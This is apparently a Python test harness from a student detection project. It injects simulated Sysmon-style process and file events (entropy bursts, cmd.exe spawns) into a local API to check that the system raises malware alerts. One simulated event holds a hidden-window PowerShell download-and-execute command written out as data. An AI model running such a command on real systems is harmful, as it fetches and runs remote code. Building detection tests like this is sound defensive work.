import requests
import json
import time
import random
from datetime import datetime

BASE_URL = "http://localhost:8000/api/layer2"
INGEST_ENDPOINT = f"{BASE_URL}/ingest"

def inject_event(event_data):
    """Inject a single event into Layer 2"""
    try:
        response = requests.post(INGEST_ENDPOINT, json=event_data, timeout=5)
        return response.status_code == 200, response.json()
    except Exception as e:
        return False, {"error": str(e)}

def generate_spawn_burst_events(num_spawns=15):
    """Generate rapid cmd.exe spawn events"""
    events = []
    base_time = time.time()
    
    for i in range(num_spawns):
        events.append({
            "ts": base_time + (i * 0.05),
            "source": "sysmon_simulated",
            "kind": "PROCESS_CREATE",
            "session_id": "sim_spawn_burst",
            "parent_process": "C:\\fyp_test\\file_modifier.exe",
            "child_process": f"C:\\Windows\\System32\\cmd.exe",
            "parent_cmd": "file_modifier.exe",
            "child_cmd": f"cmd.exe /c echo Spawn_{i}",
            "parent_pid": "1234",
            "child_pid": str(2000 + i),
            "parent_guid": "{12345678-1234-1234-1234-123456789012}",
            "child_guid": f"{{87654321-4321-4321-4321-210987654321}}"
        })
    
    return events

def generate_file_burst_events(num_files=40):
    """Generate high-entropy file creation events"""
    events = []
    base_time = time.time()
    
    for i in range(num_files):
        events.append({
            "ts": base_time + (i * 0.025),
            "source": "sysmon_simulated",
            "kind": "FILE_CREATE",
            "session_id": "sim_entropy_burst",
            "parent_process": "C:\\fyp_test\\file_modifier.exe",
            "target_path": f"C:\\fyp_test\\payload\\stage_{i:02d}.bin",
            "file_entropy": random.uniform(7.0, 7.9),  # High entropy
        })
    
    return events

def generate_rename_burst_events(num_renames=20):
    """Generate file rename/modification burst"""
    events = []
    base_time = time.time()
    
    for i in range(num_renames):
        events.append({
            "ts": base_time + (i * 0.030),
            "source": "sysmon_simulated",
            "kind": "FILE_WRITE",
            "session_id": "sim_rename_burst",
            "parent_process": "C:\\fyp_test\\file_modifier.exe",
            "target_path": f"C:\\fyp_test\\payload\\stage_{i:02d}.bin",
            "file_entropy": random.uniform(7.5, 7.95),  # High entropy writes
        })
    
    return events

def generate_suspicious_powershell_event():
    """Generate suspicious PowerShell event"""
    return {
        "ts": time.time(),
        "source": "sysmon_simulated",
        "kind": "PROCESS_CREATE",
        "session_id": "sim_suspicious_ps",
        "parent_process": "C:\\fyp_test\\file_modifier.exe",
        "child_process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_cmd": "file_modifier.exe",
        "child_cmd": "powershell.exe -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.ps1')",
        "parent_pid": "1234",
        "child_pid": "3000",
        "parent_guid": "{12345678-1234-1234-1234-123456789012}",
        "child_guid": "{87654321-4321-4321-4321-999999999999}"
    }

def main():
    print("[*] Aggressive Malware Event Injector")
    print(f"[*] Target: {INGEST_ENDPOINT}")
    print()
    
    # Verify backend is reachable
    try:
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print(f"[+] Backend is running: {response.json()}")
        else:
            print(f"[-] Backend returned status {response.status_code}")
            return
    except Exception as e:
        print(f"[-] Cannot reach backend: {e}")
        print("[!] Ensure uvicorn backend is running on port 8000")
        return
    
    print()
    
    # Phase 1: High-entropy file burst
    print("[PHASE 1] Injecting file creation burst (40 files, high entropy)...")
    file_events = generate_file_burst_events(40)
    for event in file_events:
        success, result = inject_event(event)
        if not success:
            print(f"  [-] Failed: {result}")
        else:
            pass  # Silent success
    print(f"[+] Injected {len(file_events)} file creation events")
    time.sleep(1)
    
    # Phase 2: Rapid cmd.exe spawns
    print("[PHASE 2] Injecting rapid cmd.exe spawn burst (15 spawns)...")
    spawn_events = generate_spawn_burst_events(15)
    for event in spawn_events:
        success, result = inject_event(event)
        if not success:
            print(f"  [-] Failed: {result}")
    print(f"[+] Injected {len(spawn_events)} cmd.exe spawn events")
    time.sleep(1)
    
    # Phase 3: File rename burst
    print("[PHASE 3] Injecting file rename/write burst (20 renames)...")
    rename_events = generate_rename_burst_events(20)
    for event in rename_events:
        success, result = inject_event(event)
        if not success:
            print(f"  [-] Failed: {result}")
    print(f"[+] Injected {len(rename_events)} file rename events")
    time.sleep(1)
    
    # Phase 4: Additional spawn burst
    print("[PHASE 4] Injecting secondary cmd.exe spawn burst (20 spawns)...")
    spawn_events_2 = generate_spawn_burst_events(20)
    for event in spawn_events_2:
        success, result = inject_event(event)
        if not success:
            print(f"  [-] Failed: {result}")
    print(f"[+] Injected {len(spawn_events_2)} secondary spawn events")
    time.sleep(1)
    
    # Phase 5: Suspicious PowerShell
    print("[PHASE 5] Injecting suspicious PowerShell event...")
    ps_event = generate_suspicious_powershell_event()
    success, result = inject_event(ps_event)
    if success:
        print(f"[+] Suspicious PowerShell event injected")
    else:
        print(f"[-] Failed: {result}")
    
    print()
    print("[COMPLETE] Aggressive malware event injection complete")
    print()
    print("[ARGUS] Expected scoring result:")
    print("  - Channel A (entropy): High (file burst + spawn rate)")
    print("  - Channel B (heuristics): High (unknown parent -> cmd.exe, suspicious PS)")
    print("  - Channel C (ML): Should detect anomalies")
    print("  - Final Score: Should exceed 0.70 threshold")
    print()
    print("[*] Check http://localhost:5174/layer3 for MALWARE ALERT incidents")
    print("[*] Check http://localhost:8000/api/layer2/live/latest for scoring details")

if __name__ == "__main__":
    main()
